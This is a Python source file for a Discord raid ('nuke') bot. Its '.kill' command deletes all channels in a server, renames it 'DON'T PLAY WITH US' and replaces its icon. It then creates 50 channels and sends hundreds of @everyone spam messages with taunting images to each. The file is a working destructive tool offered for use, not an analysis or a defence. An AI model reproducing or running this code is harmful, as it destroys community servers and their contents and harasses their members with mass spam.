import discord
from discord.ext import commands
import os
import asyncio
import aiohttp

# Bot configuration
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True

bot = commands.Bot(command_prefix='.', intents=intents)

# Define las variables de entorno directamente
SPAM_MESSAGE = "@everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone @everyone "  # Cambia esto por el mensaje que desees
BOT_TOKEN = "bot_token_here"  # Reemplaza esto con tu token de bot

@bot.event
async def on_ready():
    print(f'Bot is ready as {bot.user}')

@bot.command(name='kill')
async def kill(ctx):
    guild = ctx.guild

    # Configuration
    SERVER_ICON_URL = "https://i.imgur.com/rOkZ8eM.png"  # Skull image
    CHANNEL_NAMES = ["Cry", "Gg", "200 headshot", "jajajaja", "hg" "lol"]
    IMAGE_URLS = [
        "https://i.imgur.com/j7coBlh.png",  # Crying baby
        "https://i.imgur.com/GfyQdI0.png",  # Sad face
        "https://i.imgur.com/39TViaM.png",  # Game over
        "https://i.imgur.com/rOkZ8eM.png",  # Skull
        "https://i.imgur.com/4e7oup9.png"   # Warning
    ]
    NUM_CHANNELS = 50  # Number of channels to create
    MESSAGES_PER_CHANNEL = 800  # 25 channels * 80 messages = 2000 total messages

    # Server modification function
    async def modify_server():
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get(SERVER_ICON_URL) as resp:
                    if resp.status == 200:
                        icon_data = await resp.read()
                        await guild.edit(name="DON'T PLAY WITH US", icon=icon_data, banner=None)
        except Exception as e:
            print(f"Error modifying server: {e}")

    # Channel creation and spam function
    async def create_and_spam(i):
        try:
            channel_name = CHANNEL_NAMES[i % len(CHANNEL_NAMES)]
            channel = await guild.create_text_channel(channel_name)
            spam_tasks = [
                channel.send(content=SPAM_MESSAGE, embed=discord.Embed().set_image(url=IMAGE_URLS[j % len(IMAGE_URLS)]))
                for j in range(MESSAGES_PER_CHANNEL)
            ]
            await asyncio.gather(*spam_tasks)
        except Exception as e:
            print(f"Error in channel {i}: {e}")

    # Execute everything simultaneously
    all_tasks = [
        modify_server(),  # Server modification
        *[channel.delete() for channel in guild.channels],  # Channel deletion
        *[create_and_spam(i) for i in range(NUM_CHANNELS)]  # Channel creation and spam
    ]

    await asyncio.gather(*all_tasks)

# Run the bot
bot.run(BOT_TOKEN)